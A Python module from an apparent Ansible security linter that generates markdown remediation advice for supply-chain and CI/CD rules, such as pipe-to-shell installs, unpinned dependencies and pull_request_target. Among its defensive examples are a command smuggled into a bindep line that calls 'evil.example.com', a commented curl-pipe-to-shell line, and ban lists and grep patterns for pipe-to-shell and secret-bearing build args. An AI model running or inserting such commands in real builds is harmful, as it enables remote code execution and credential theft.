#!/usr/bin/env python3
"""
Remediation generator for supply chain integrity issues
"""

from __future__ import annotations

from .base import BaseRemediationGenerator, _render_from_metadata


class SupplyChainRemediationGenerator(BaseRemediationGenerator):
    """Generates remediation examples for supply chain security issues"""

    _FIX_MAP = {
        "curl_pipe_to_shell": "curl_pipe_shell",
        "gem_install_local": "install_script",
        "get_url_no_checksum": "get_url_no_checksum",
        "gitlab_snippet_execution": "curl_pipe_shell",
        "install_script_from_url": "install_script",
        "npm_global_install_untrusted": "install_script",
        "pip_install_no_version": "pip_no_pin",
        "python_build_from_source": "pip_no_pin",
        "python_remote_exec": "python_remote_exec",
        "python_setup_py_exec": "pip_no_pin",
        "raw_github_script_exec": "raw_github",
        "wget_pipe_to_shell": "wget_pipe_shell",
        # Ecosystem hygiene (role meta, molecule, EE, bindep)
        "bindep_profile_runs_shell": "bindep_shell",
        "bindep_unpinned_package": "bindep_unpinned",
        "ee_additional_build_files_traversal": "ee_build_files_traversal",
        "ee_additional_build_steps_append_shell": "ee_append_shell",
        "ee_arbitrary_prepend_cmd": "ee_prepend",
        "ee_build_arg_secret": "ee_build_arg_secret",
        "ee_dependencies_galaxy_http": "ee_galaxy_http",
        "ee_dependencies_python_unpinned": "ee_python_unpinned",
        "ee_untrusted_base_image": "ee_base_image",
        "molecule_disable_tls_verify": "molecule_tls",
        "molecule_docker_socket_mount": "molecule_socket",
        "molecule_privileged_container": "molecule_privileged",
        "role_meta_dependency_git_url": "role_meta_git",
        "role_meta_dependency_without_version": "role_meta_unpinned",
        "role_meta_galaxy_info_missing_license": "role_meta_license",
        # CI/CD self-modification
        "gh_actions_pull_request_target": "gh_actions_pull_request_target",
        "gh_actions_unpinned_sha": "gh_actions_unpinned_sha",
        "git_hook_or_config_write": "git_hook_or_config_write",
        "self_modifying_ci_config": "self_modifying_ci_config",
        "selfhosted_runner_untrusted_event": "selfhosted_runner_untrusted_event",
    }

    def generate_supply_chain_fix(self, rule_id: str, code_snippet: str) -> str:
        generators = {
            "curl_pipe_shell": self._generate_curl_pipe_fix,
            "wget_pipe_shell": self._generate_wget_pipe_fix,
            "python_remote_exec": self._generate_python_remote_fix,
            "pip_no_pin": self._generate_pip_pin_fix,
            "raw_github": self._generate_github_raw_fix,
            "install_script": self._generate_install_script_fix,
            "get_url_no_checksum": self._generate_get_url_checksum_fix,
            "role_meta_unpinned": self._generate_role_meta_unpinned_fix,
            "role_meta_git": self._generate_role_meta_git_fix,
            "role_meta_license": self._generate_role_meta_license_fix,
            "molecule_socket": self._generate_molecule_socket_fix,
            "molecule_privileged": self._generate_molecule_privileged_fix,
            "molecule_tls": self._generate_molecule_tls_fix,
            "ee_base_image": self._generate_ee_base_image_fix,
            "ee_prepend": self._generate_ee_prepend_fix,
            "ee_append_shell": self._generate_ee_append_shell_fix,
            "ee_galaxy_http": self._generate_ee_galaxy_http_fix,
            "ee_python_unpinned": self._generate_ee_python_unpinned_fix,
            "ee_build_files_traversal": self._generate_ee_build_files_traversal_fix,
            "ee_build_arg_secret": self._generate_ee_build_arg_secret_fix,
            "bindep_unpinned": self._generate_bindep_unpinned_fix,
            "bindep_shell": self._generate_bindep_shell_fix,
            "gh_actions_unpinned_sha": self._generate_gh_actions_unpinned_sha_fix,
            "gh_actions_pull_request_target": self._generate_gh_actions_pull_request_target_fix,
            "self_modifying_ci_config": self._generate_self_modifying_ci_config_fix,
            "git_hook_or_config_write": self._generate_git_hook_or_config_write_fix,
            "selfhosted_runner_untrusted_event": self._generate_selfhosted_runner_untrusted_event_fix,
        }
        issue_type = self._FIX_MAP.get(rule_id, "generic")
        gen = generators.get(issue_type)
        if gen is None:
            return self._generate_pattern_driven_fix(rule_id, code_snippet)
        return gen(code_snippet)

    def _generate_curl_pipe_fix(self, code_snippet: str) -> str:
        return f"""
**Vulnerable Code:**
```yaml
{code_snippet}
```

**Secure Fix:**
```yaml
- name: Download install script
  get_url:
    url: "https://example.com/install.sh"
    dest: /tmp/install.sh
    mode: '0755'
    checksum: "sha256:abc123..."  # pin to known-good hash

- name: Verify and execute install script
  ansible.builtin.shell: /tmp/install.sh
  args:
    executable: /bin/bash

- name: Clean up install script
  ansible.builtin.file:
    path: /tmp/install.sh
    state: absent
```

**Why this matters:** Piping remote content to a shell allows MITM or compromised-host attacks to execute arbitrary code. Download first, verify integrity, then execute.
"""

    def _generate_wget_pipe_fix(self, code_snippet: str) -> str:
        return f"""
**Vulnerable Code:**
```yaml
{code_snippet}
```

**Secure Fix:**
```yaml
- name: Download script with integrity check
  get_url:
    url: "https://example.com/script.sh"
    dest: /tmp/script.sh
    mode: '0755'
    checksum: "sha256:<known-good-hash>"

- name: Execute verified script
  ansible.builtin.shell: /tmp/script.sh
  args:
    executable: /bin/bash
```

**Why this matters:** wget piped to shell is equivalent to curl|bash - a supply chain attack vector.
"""

    def _generate_python_remote_fix(self, code_snippet: str) -> str:
        return f"""
**Vulnerable Code:**
```yaml
{code_snippet}
```

**Secure Fix:**
```yaml
- name: Download Python script
  get_url:
    url: "https://example.com/setup.py"
    dest: /tmp/setup.py
    checksum: "sha256:<known-good-hash>"

- name: Execute verified Python script
  ansible.builtin.command: python3 /tmp/setup.py
```
"""

    def _generate_pip_pin_fix(self, code_snippet: str) -> str:
        return f"""
**Vulnerable Code:**
```yaml
{code_snippet}
```

**Secure Fix:**
```yaml
- name: Install pinned Python packages
  ansible.builtin.pip:
    name: "package_name==1.2.3"
    state: present

# Or better, use a requirements file with hashes:
- name: Install from requirements with hash verification
  ansible.builtin.pip:
    requirements: /path/to/requirements.txt
    # requirements.txt contains: package==1.2.3 --hash=sha256:abc123...
```
"""

    def _generate_github_raw_fix(self, code_snippet: str) -> str:
        return f"""
**Vulnerable Code:**
```yaml
{code_snippet}
```

**Secure Fix:**
```yaml
- name: Download script from pinned commit
  get_url:
    url: "https://raw.githubusercontent.com/org/repo/<commit-sha>/scripts/install.sh"
    dest: /tmp/install.sh
    mode: '0755'
    checksum: "sha256:<known-good-hash>"

- name: Execute verified script
  ansible.builtin.shell: /tmp/install.sh
  args:
    executable: /bin/bash
```

**Why this matters:** raw.githubusercontent.com URLs pointing to `master`/`main` can change at any time. Pin to a specific commit SHA and verify the checksum.
"""

    def _generate_install_script_fix(self, code_snippet: str) -> str:
        return f"""
**Vulnerable Code:**
```yaml
{code_snippet}
```

**Secure Fix:**
```yaml
# Pin to a specific version and verify checksum
- name: Download Helm install script (pinned version)
  get_url:
    url: "https://raw.githubusercontent.com/helm/helm/v3.14.0/scripts/get-helm-3"
    dest: /tmp/get-helm-3.sh
    mode: '0755'
    checksum: "sha256:<known-good-hash>"

- name: Install Helm from verified script
  ansible.builtin.shell: /tmp/get-helm-3.sh
  args:
    executable: /bin/bash
  environment:
    DESIRED_VERSION: "v3.14.0"
```
"""

    def _generate_get_url_checksum_fix(self, code_snippet: str) -> str:
        return f"""
**Vulnerable Code:**
```yaml
{code_snippet}
```

**Secure Fix:**
```yaml
- name: Download binary with checksum verification
  get_url:
    url: "https://releases.example.com/tool/v1.2.3/tool_linux_amd64.tar.gz"
    dest: /tmp/tool.tar.gz
    checksum: "sha256:<known-good-hash>"
```

**Why this matters:** Without checksum verification, a compromised mirror or MITM attack could replace the binary with a malicious one.
"""

    def _generate_generic_supply_chain_fix(self, code_snippet: str) -> str:
        return f"""
**Vulnerable Code:**
```yaml
{code_snippet}
```

**Secure Fix:**
- Pin all remote resources to specific versions or commit SHAs
- Verify checksums of all downloaded artifacts
- Use `get_url` with `checksum:` instead of curl/wget
- Use a requirements/lock file with hash pinning for package managers
"""

    def _generate_pattern_driven_fix(self, rule_id: str, code_snippet: str) -> str:
        return _render_from_metadata(rule_id, code_snippet)

    # Ecosystem remediation generators
    def _generate_role_meta_unpinned_fix(self, code_snippet: str) -> str:
        return f"""
**Unpinned role dependency in meta/main.yml:**
```yaml
{code_snippet}
```

**Why this matters:** An unpinned Galaxy role dependency resolves to whatever
the upstream maintainer publishes at install time. A compromised or
malicious release ships into every `ansible-galaxy install -r` run.

**Secure fix - pin to an immutable version or sha:**
```yaml
dependencies:
  - role: geerlingguy.nginx
    version: "3.1.1"          # pinned Galaxy release
  - src: https://github.com/acme/ansible-role-foo
    version: "abc123def456"   # pinned git sha, not a branch
```

**Hardening:**
- Keep a `collections/requirements.yml` with every role + its version pinned.
- Add a CI step that diffs the installed roles against a committed `roles.lock`
  (generate with `ansible-galaxy role list --format=yaml > roles.lock`).
- Treat an unpinned role dep as a PR blocker, same as a missing package version.
"""

    def _generate_role_meta_git_fix(self, code_snippet: str) -> str:
        return f"""
**Role pulled from a git URL:**
```yaml
{code_snippet}
```

**Why this matters:** A git URL without a pinned `version:` is a moving
target. The upstream repo's default branch can be force-pushed; a compromised
maintainer can silently swap content under the same URL.

**Secure fix:**
```yaml
dependencies:
  - src: https://github.com/acme/ansible-role-foo
    version: "abc123def4567890..."   # immutable sha, NOT a branch name
    scm: git
```

**Even better - prefer Galaxy:** a Galaxy-published role has a signed,
versioned artefact; a git URL does not. Only use git URLs for internal forks
you control end-to-end.
"""

    def _generate_role_meta_license_fix(self, code_snippet: str) -> str:
        return f"""
**Role meta/main missing `license:`:**
```yaml
{code_snippet}
```

**Why this matters:** A role with no declared license can't be safely
consumed in commercial pipelines. Downstream users are in legal limbo - some
corporate CI systems will refuse to install an unlicensed role at all.

**Fix - add an SPDX identifier matching your LICENSE file:**
```yaml
galaxy_info:
  author: Your Name
  description: What this role does
  license: MIT                 # or Apache-2.0, BSD-3-Clause, GPL-3.0-or-later
  min_ansible_version: "2.14"
  platforms:
    - name: EL
      versions: ["9"]
```

Always use the SPDX identifier (`MIT`, not "MIT License"). CI linters verify
it against the SPDX list.
"""

    def _generate_molecule_socket_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 Molecule mounts /var/run/docker.sock (container-escape primitive):**
```yaml
{code_snippet}
```

**Why this is CRITICAL:** The Docker socket inside a container gives that
container full control of the Docker daemon on the host. A compromised role
under test runs `docker run --privileged --pid=host --net=host` on your
CI runner - full host takeover, every `molecule test`.

**Secure fix - remove the bind mount; use Molecule's native driver:**
```yaml
platforms:
  - name: instance
    image: "geerlingguy/docker-rockylinux9-ansible:latest"
    command: ""
    pre_build_image: true
    # No volumes:[...] mounting /var/run/docker.sock.
```

**If you genuinely need docker-in-docker** for tests, use an isolated DinD
sidecar service with its own socket - never bind-mount the host's.

**CI hardening:** Deny-list the host socket in your runner's seccomp profile:
`"/var/run/docker.sock"` is never a legitimate mount for a test scenario.
"""

    def _generate_molecule_privileged_fix(self, code_snippet: str) -> str:
        return f"""
**Molecule scenario runs with `privileged: true`:**
```yaml
{code_snippet}
```

**Why this matters:** `privileged: true` grants the container every kernel
capability plus access to host devices. A bad role under test gets raw
kernel-level reach on the CI host.

**Secure fix - drop privileged; add only what's strictly needed:**
```yaml
platforms:
  - name: instance
    image: "geerlingguy/docker-rockylinux9-ansible:latest"
    # If the role under test uses systemd, use this - NOT privileged:
    systemd: always
    tmpfs:
      - /run
      - /tmp
    capabilities:
      - SYS_ADMIN       # only if role manages cgroups/mounts
    command: /usr/sbin/init
```

Most Ansible role tests work with `systemd: always` + specific `capabilities`.
Reach for `privileged: true` only when profiling kernel modules, and isolate
such scenarios on a dedicated runner.
"""

    def _generate_molecule_tls_fix(self, code_snippet: str) -> str:
        return f"""
**Molecule driver disables TLS verification:**
```yaml
{code_snippet}
```

**Why this matters:** `tls_verify: false` / `verify_ssl: false` / `insecure_registry`
turns the registry pull into an MITM-able channel. An attacker on the CI
network swaps the test image and runs arbitrary code in every test run.

**Secure fix - keep TLS verification ON:**
```yaml
driver:
  name: docker
  # tls_verify, verify_ssl default to true - don't touch them.

# If your registry has a private CA, mount the CA bundle into the container
# rather than disabling verification:
platforms:
  - name: instance
    image: "registry.corp.example.com/ansible/testimage:1.2.3@sha256:..."
    volumes:
      - "/etc/pki/ca-trust/source/anchors:/etc/pki/ca-trust/source/anchors:ro"
```

If you truly must bypass TLS for a local dev registry, scope it to that
single registry in Docker's `daemon.json` and never commit that config.
"""

    def _generate_ee_base_image_fix(self, code_snippet: str) -> str:
        return f"""
**Execution Environment base image not pinned to a digest:**
```yaml
{code_snippet}
```

**Why this matters:** `name: foo/bar:latest` (or any floating tag) pulls
whatever the upstream publishes at build time. The maintainer - or a
compromised upstream - can swap it silently into every subsequent EE build.

**Secure fix - pin to an immutable digest:**
```yaml
version: 3
images:
  base_image:
    name: registry.redhat.io/ansible-automation-platform-24/ee-minimal-rhel9@sha256:abc123...
dependencies:
  ansible_core:
    package_pip: "ansible-core==2.15.8"
  ansible_runner:
    package_pip: "ansible-runner==2.3.6"
  galaxy: requirements.yml
  python: requirements.txt
  system: bindep.txt
```

**Digest rotation policy:** update the digest via PR, gated on a CI
run that verifies the new image builds cleanly. Never use `:latest`.
"""

    def _generate_ee_prepend_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE additional_build_steps.prepend runs arbitrary shell:**
```yaml
{code_snippet}
```

**Why this is CRITICAL:** `additional_build_steps.prepend` runs as `RUN`
directives during the `ansible-builder` image build. A `curl | sh` primitive
here bakes a backdoor into every EE built from this file - every ad-hoc
Ansible run on the controller subsequently executes attacker code.

**Secure fix - replace shell with declarative alternatives:**
```yaml
# Instead of running curl | sh, vendor the file and COPY it:
additional_build_steps:
  prepend: |
    COPY _preflight/setup.sh /tmp/setup.sh
    RUN sha256sum /tmp/setup.sh | grep -q '^abc123 ' && /tmp/setup.sh
```

**Reviewable patterns only:**
- `COPY` files committed to the repo.
- `RUN` with a checksum-gated script.
- `ENV`, `LABEL`, `USER`.

**Anti-patterns (ban in CI):** `curl ... | sh`, `wget -O- ... | bash`,
`eval $(...)`, any pipe-to-shell primitive in a `prepend` step.
"""

    def _generate_ee_append_shell_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE additional_build_steps.append pipes to shell:**
```yaml
{code_snippet}
```

**Why this is CRITICAL:** `append` runs at the END of the EE image build as
`RUN` directives - a `curl | sh` here is equivalent to the prepend variant
(build-time RCE that bakes into every EE run) but with the added property
that it lands in the final layer, so earlier cached layers can't short-circuit
it. Every ad-hoc playbook executed against this EE afterwards runs the
attacker-controlled tail step.

**Secure fix - stage the payload, verify, then install from local:**
```yaml
# bad:
# additional_build_steps:
#   append: |
#     RUN curl -fsSL https://example.com/install.sh | sh
# good:
additional_build_files:
  - src: files/install.sh
    dest: configs
additional_build_steps:
  append: |
    COPY _build/configs/install.sh /tmp/install.sh
    RUN echo "<sha256-hex>  /tmp/install.sh" | sha256sum -c - \\
     && chmod 0755 /tmp/install.sh \\
     && /tmp/install.sh
```

**Reviewable patterns only in `append`:**
- `RUN <package-manager> clean / cache purge` (e.g., `dnf clean all`).
- `USER <non-root>` to downgrade from build-root.
- `LABEL` / `ENV` finalization.
- Checksum-gated installs from paths already in the build context.

**Anti-patterns (ban in CI):** `curl ... | sh`, `wget -O- ... | bash`,
`pip install <url>`, `bash <(curl ...)`, any pipe-to-shell primitive.
Enforce with a CI check that greps the EE definition for `curl|wget` within
`additional_build_steps.append` and fails the build.
"""

    def _generate_ee_galaxy_http_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE dependencies.galaxy references HTTP(S) URL:**
```yaml
{code_snippet}
```

**Why this is HIGH:** `ansible-builder` downloads whatever the URL returns
at build time. A compromised fetch - MITM, CDN cache poisoning, typo-squat,
repo account takeover - silently swaps the collections/roles installed into
the EE. The EE git repo shows no change; every rebuild pulls the new payload.

**Secure fix - commit the requirements file locally:**
```yaml
# execution-environment.yml
version: 3
images:
  base_image:
    name: registry.redhat.io/ansible-automation-platform-24/ee-minimal-rhel9@sha256:<digest>
dependencies:
  galaxy: requirements.yml       # local file, auditable in git
  python: requirements.txt
```

**`requirements.yml` (committed alongside):**
```yaml
collections:
  - name: community.general
    version: "9.0.1"            # exact version
  - name: ansible.posix
    version: "1.5.4"
  - name: myorg.internal
    source: git+ssh://git@github.com/myorg/ansible-collection-internal.git
    type: git
    version: "e3a1f2b9c4d5e6f708192a3b4c5d6e7f8091a2b3"   # commit SHA, not a branch
roles:
  - src: geerlingguy.postgresql
    version: "3.5.2"
```

**Hardening:**
- Mirror galaxy.ansible.com through your internal Artifactory/Nexus and pin
  `server_list` in `ansible.cfg` to the mirror (cuts egress + MITM risk).
- CI check: `grep -E '^\\s*galaxy\\s*:\\s*https?://' execution-environment.yml`
  - fail the build if any hit.
- Review collection/role updates in a PR that also re-locks the file
  (`ansible-galaxy collection install -r requirements.yml --list`).
"""

    def _generate_ee_python_unpinned_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE dependencies.python contains unpinned package:**
```yaml
{code_snippet}
```

**Why this is MEDIUM:** Each EE rebuild resolves unpinned packages against
live PyPI. A single compromised upstream (shai-hulud-style account takeover,
ctx typo-squat, dependency confusion in internal mirrors) gets baked into
the EE on the next build and runs inside every ad-hoc Ansible execution on
the controller.

**Secure fix - generate a hash-locked file with pip-compile:**
```bash
pip install pip-tools
pip-compile --generate-hashes --output-file requirements.txt requirements.in
```

**`requirements.in` (the source of truth):**
```text
requests==2.32.3
boto3==1.34.51
jinja2==3.1.4
```

**`requirements.txt` (generated, checked into git):**
```text
requests==2.32.3 \\
    --hash=sha256:70761cfe03c773ceb22aa2f671b4757976145175cdfca038c02654d061d6dcc6 \\
    --hash=sha256:55365417734eb18255590a9ff9eb97e9e1da868d4ccd6402399eaf68af20a760
# ... every transitive pinned + hashed ...
```

**`execution-environment.yml`:**
```yaml
dependencies:
  python: requirements.txt     # pinned + hashed, deterministic
```

**Hardening:**
- Use an internal PyPI mirror (DevPi, Artifactory) as `--index-url` in the
  EE build so dependency confusion (internal vs. public name collision) is
  not exploitable.
- CI gate: re-run `pip-compile --upgrade` on a schedule (e.g. weekly) and
  open a PR with the diff - every dependency change gets human review.
- Scan the locked file with Trivy/Grype as part of the EE build pipeline.
"""

    def _generate_ee_build_files_traversal_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE additional_build_files uses path traversal or absolute path:**
```yaml
{code_snippet}
```

**Why this is HIGH:** `ansible-builder` copies every path listed under
`additional_build_files` into the EE build context. If the path escapes the
project directory (`../../secrets/`, `/root/.ssh/id_rsa`), the EE can
silently include host secrets or content from anywhere the build user can
read - a compromised EE definition becomes an exfiltration primitive that a
reviewer won't notice unless they trace every `src:` line.

**Secure fix - keep sources inside the project tree:**
```yaml
additional_build_files:
  - src: files/cacert.pem       # within the EE project
    dest: configs
  - src: files/app.conf
    dest: configs
```

**If the source truly lives outside the project tree, stage it in CI first:**
```yaml
# .github/workflows/build-ee.yml
- name: Stage external artifact
  run: |
    install -m 0644 /opt/release/my-tool ee/files/my-tool
    echo "<sha256>  ee/files/my-tool" | sha256sum -c -
- name: Build EE
  run: ansible-builder build -t my-ee:latest --context ./ee
```
- the EE definition itself only references `files/my-tool`, which a
reviewer can see in the git diff.

**Hardening:**
- CI check: fail the build if any `additional_build_files.src` starts with
  `..`, `/`, `~`, or resolves outside the EE project directory.
- Treat `additional_build_files` as security-critical in code review; require
  a second reviewer for changes to it.
- Never allow `src:` to reference `~/.ssh/`, `/root/`, or any path outside
  the EE repo.
"""

    def _generate_ee_build_arg_secret_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE ARG exposes credential-shaped variable:**
```yaml
{code_snippet}
```

**Why this is HIGH:** Values passed to `docker build --build-arg SECRET=...`
are persisted in the image's layer metadata. `docker history --no-trunc` and
`podman image inspect` both print the `ARG` lines verbatim - any consumer of
the EE image (downstream registry, CI caches, scanners, operators pulling
for debugging) sees the secret. This is the #1 way production tokens leak
from CI-built images.

**Secure fix - BuildKit secret mounts (not persisted in the image):**
```dockerfile
# syntax=docker/dockerfile:1.7
FROM registry.redhat.io/.../ee-minimal-rhel9:latest

# Secret is available ONLY during this RUN, never baked into a layer:
RUN --mount=type=secret,id=pypi_token,target=/run/secrets/pypi_token \\
    pip config set global.index-url \\
      "https://__token__:$(cat /run/secrets/pypi_token)@pypi.example.com/simple/" \\
 && pip install --no-cache-dir -r requirements.txt
```

**Supply the secret at build time (not in the Dockerfile):**
```bash
DOCKER_BUILDKIT=1 docker build \\
  --secret id=pypi_token,src="$HOME/.secrets/pypi_token" \\
  -t my-ee:latest .
```

**For ansible-builder specifically, move the secret-requiring step into CI
so the EE never sees the credential:**
```yaml
# CI job - before ansible-builder runs
- name: Pre-fetch private collections
  env:
    GALAXY_TOKEN: ${{{{ secrets.GALAXY_TOKEN }}}}
  run: |
    ansible-galaxy collection install -r ee/requirements.yml \\
      -p ee/_vendored_collections
# Now the EE build references ee/_vendored_collections via additional_build_files;
# the token never touches the image.
- name: Build EE
  run: ansible-builder build -t my-ee:latest --context ./ee
```

**Hardening:**
- CI check: grep the Containerfile / EE definition for `ARG ` followed by
  any of `SECRET|TOKEN|KEY|PASSWORD|PASSWD`; fail the build on a hit.
- Scan every EE image push with Trivy's `--security-checks secret` to catch
  leaks that slipped past code review.
- Rotate any credential that ever appeared as a build-arg; treat it as
  public.
"""

    def _generate_bindep_unpinned_fix(self, code_snippet: str) -> str:
        return f"""
**bindep.txt entry without a version constraint:**
```yaml
{code_snippet}
```

**Why this matters:** A bare package name in `bindep.txt` pulls whatever the
distro publishes at build time. Future EE rebuilds silently upgrade/downgrade
system packages - invalidates cached CVE scan results and breaks reproducible
builds.

**Secure fix - add a version constraint + platform tag:**
```
# bindep.txt
openssl [platform:rpm >=3.0.7]
libffi-devel [platform:rpm]
git [platform:rpm >=2.39]
```

**For hard pins:** use `==`:
```
openssl [platform:rpm ==3.0.7-25.el9_3]
```

**CI hardening:** diff `bindep.txt` against a lockfile generated from a
successful build. Any silent drift in system package versions must appear in
the PR's CI output.
"""

    def _generate_bindep_shell_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 bindep.txt entry contains a shell primitive:**
```yaml
{code_snippet}
```

**Why this is CRITICAL:** bindep evaluates its profile lines. A `$(...)`,
backtick, or pipe-to-shell primitive here runs arbitrary shell during every
EE build - and EE builds run in CI under the controller's credentials.

**Secure fix - bindep lines are PURE package specs, nothing else:**
```
# ❌ NEVER
custom-package [platform:rpm]  $(curl evil.example.com)

# ✅ Pure package name + platform tag + optional version:
custom-package [platform:rpm >=1.0]
```

**If you genuinely need a preflight script** during image build, put it in
`execution-environment.yml`'s `additional_build_steps` (which is at least
reviewable and subject to the `ee_arbitrary_prepend_cmd` rule) - never in
`bindep.txt`.

**Pre-commit enforcement:** `rg -n '(\\$\\(|\\`|\\|\\s*(sh|bash))' bindep.txt`
should return zero matches.
"""

    def _generate_gh_actions_unpinned_sha_fix(self, code_snippet: str) -> str:
        return f"""
**❌ Vulnerable Code:**
```yaml
{code_snippet}
```

**🚨 Third-Party Action Not Pinned to a SHA:**
`uses: owner/action@v1` (or `@main`, `@master`, `@latest`) is a **mutable** tag.
Any compromise of the action's tag - including a malicious retag by a
maintainer - lands silently in every subsequent workflow run. This is exactly
how the tj-actions/changed-files 2025 supply-chain attack propagated.

**✅ Secure Fix - pin every third-party action to a full 40-character SHA:**
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: tj-actions/changed-files@a284dc1814e3fe7ab40ebf11b00c5ad83d5c9b74  # v45.0.4
        # Keep the version in a trailing comment so humans can read it.
```

**✅ Automate SHA maintenance with Dependabot (`.github/dependabot.yml`):**
```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

**🔐 Organization-wide enforcement:**
- Enable **required actions** in org settings: restrict allowed actions to
  `actions/*`, `github/*`, and an explicit allowlist; require SHA pinning.
- Add a pre-merge CI check with `stepsecurity/harden-runner` in audit mode -
  it fails PRs that introduce unpinned third-party actions.
- Audit quarterly: `git grep -E 'uses: [^/]+/[^@]+@(v[0-9]|main|master|latest)'`
  across all workflows should return zero matches for third-party actions.
"""

    def _generate_gh_actions_pull_request_target_fix(self, code_snippet: str) -> str:
        return f"""
**❌ Vulnerable Code:**
```yaml
{code_snippet}
```

**🚨 pull_request_target is a Fork-Takeover Primitive:**
`pull_request_target` runs in the **base repository's** context, with its
secrets and a read-write `GITHUB_TOKEN`, NOT the fork's. If the workflow then
checks out the PR head (`ref: ${{{{ github.event.pull_request.head.sha }}}}`)
or runs any fork-controlled code, **any outside contributor** who opens a pull
request gets arbitrary code execution with your repository's write token.

**✅ Secure Fix - prefer `pull_request` (runs in the fork's sandboxed context):**
```yaml
on:
  pull_request:
    branches: [main]
    # Runs with GITHUB_TOKEN that has read-only permissions in forks.
```

**✅ If you genuinely need base-repo secrets, gate strictly:**
```yaml
on:
  pull_request_target:
    types: [labeled]
jobs:
  integration:
    if: >-
      github.event.label.name == 'safe-to-test' &&
      github.event.pull_request.author_association == 'MEMBER'
    runs-on: ubuntu-latest
    steps:
      # NEVER check out PR head code before these gates pass:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{{{ github.event.pull_request.head.sha }}}}
          persist-credentials: false
```

**🔐 Hardening:**
- Default `permissions:` to `contents: read` at the workflow root; grant
  write permissions only on jobs that absolutely need them.
- Use `persist-credentials: false` on `actions/checkout` to prevent the
  token from leaking to any script the PR runs.
- Background reading: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
"""

    def _generate_self_modifying_ci_config_fix(self, code_snippet: str) -> str:
        return f"""
**❌ Vulnerable Code:**
```yaml
{code_snippet}
```

**🚨 Playbook Modifies Its Own CI Configuration:**
A task writing to `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`,
`bitbucket-pipelines.yml`, `azure-pipelines.yml`, `.circleci/config.yml`, or
`.drone.yml` is the **canonical persistence + privilege-escalation primitive**.
Whoever owns the playbook effectively owns every future CI token the pipeline
is issued - including any deploy keys, cloud OIDC bindings, and publish tokens.

**✅ Secure Fix - CI config must be changed by reviewed commits, not automation:**
```yaml
# WRONG - never do this from inside a CI job:
# - copy:
#     src: new-workflow.yml
#     dest: .github/workflows/deploy.yml

# RIGHT - if you truly need generated CI (monorepo matrices, generated
# language bindings), generate it into a PR, not in-place:
- name: generate workflow matrix
  ansible.builtin.template:
    src: matrix.yml.j2
    dest: "{{{{ tmpdir }}}}/deploy.yml"

- name: open PR with updated workflow
  ansible.builtin.shell: |
    gh pr create --title "ci: regenerate deploy matrix" \\
      --body "Automated regeneration" --base main --head regen-deploy
  environment:
    GH_TOKEN: "{{{{ lookup('env', 'READ_ONLY_BOT_TOKEN') }}}}"
```

**🔐 Organization-wide enforcement:**
- **CODEOWNERS**: require a security-team review on any change to
  `.github/workflows/**`, `.gitlab-ci.yml`, `Jenkinsfile`, etc.
- **Branch protection**: require CODEOWNERS review + signed commits on
  branches that own CI files.
- **GitHub Actions permissions**: set workflow `permissions:` to
  `contents: read` by default so even a compromised job cannot push a workflow
  change without a human-reviewed PR.
- **Separate generation from application**: generated CI lives in a
  different branch that opens a PR; never apply generated CI in the same
  job that generated it.
"""

    def _generate_git_hook_or_config_write_fix(self, code_snippet: str) -> str:
        return f"""
**❌ Vulnerable Code:**
```yaml
{code_snippet}
```

**🚨 Git Internals Modification is a Persistence + Credential-Theft Primitive:**
Writing to `.git/hooks/*`, `.git/config`, `.gitconfig`, `.gitattributes`, or
setting `core.hooksPath`, `core.sshCommand`, `http.extraheader`, or
`credential.helper` gives attackers execution on every subsequent `git`
command. The `core.sshCommand` form is **actively used in the wild** to proxy
all git authentication through an attacker-controlled host - stealing every
push credential.

**✅ Secure Fix - never write to .git/* from a playbook:**
```yaml
# WRONG:
# - copy:
#     src: pre-commit
#     dest: .git/hooks/pre-commit
#     mode: '0755'

# RIGHT - distribute git hooks via pre-commit.com or husky, which live in the
# repository itself and only activate after an explicit opt-in:
- name: install pre-commit framework
  ansible.builtin.pip:
    name: "pre-commit==3.6.0"
    state: present

- name: install pre-commit hooks (reads .pre-commit-config.yaml from repo root)
  ansible.builtin.command: pre-commit install --install-hooks
  args:
    chdir: "{{{{ repo_path }}}}"
  # This writes .git/hooks/pre-commit, but it does so with a checksum-gated,
  # developer-initiated command - not a silent playbook modification.
```

**🔐 If you need enforceable policy, use server-side controls:**
- **Protected branches** (GitHub/GitLab) with required reviews + required
  status checks - these are enforced server-side, not by `.git/hooks`.
- **CODEOWNERS** for path-specific review requirements.
- **Server-side pre-receive hooks** (on self-hosted git) - these run in a
  trusted context, unlike client-side `.git/hooks` which are untrusted.

**🔎 Detection:** audit for drift with
`git config --local --list | grep -E '^core\\.(hooksPath|sshCommand)|^http\\.extraheader|^credential\\.helper'`.
Legitimate values are uncommon; investigate any non-empty output.
"""

    def _generate_selfhosted_runner_untrusted_event_fix(self, code_snippet: str) -> str:
        return f"""
**❌ Vulnerable Code:**
```yaml
{code_snippet}
```

**🚨 Self-Hosted Runner Reachable by Outside Contributors:**
A job declaring `runs-on: self-hosted` (or any self-hosted label) that triggers
on `pull_request`, `pull_request_target`, `issue_comment`, or `workflow_run`
**without a trusted-actor guard** is a direct path for any outside contributor
to run arbitrary code on your self-hosted runner. GitHub explicitly warns
against this configuration - self-hosted runners are typically long-lived
machines with network and filesystem persistence, so the blast radius of one
malicious PR is the entire runner's reachable infrastructure.

**✅ Secure Fix - option A: use GitHub-hosted runners for fork-triggered jobs:**
```yaml
on: pull_request
jobs:
  lint:
    runs-on: ubuntu-latest  # ephemeral, GitHub-hosted, forks are safe here.
    steps: [...]
```

**✅ Secure Fix - option B: gate self-hosted jobs with a trusted-actor check:**
```yaml
on:
  pull_request_target:
    types: [labeled]
jobs:
  integration:
    if: >-
      github.event.label.name == 'safe-to-test' &&
      (github.event.pull_request.author_association == 'MEMBER' ||
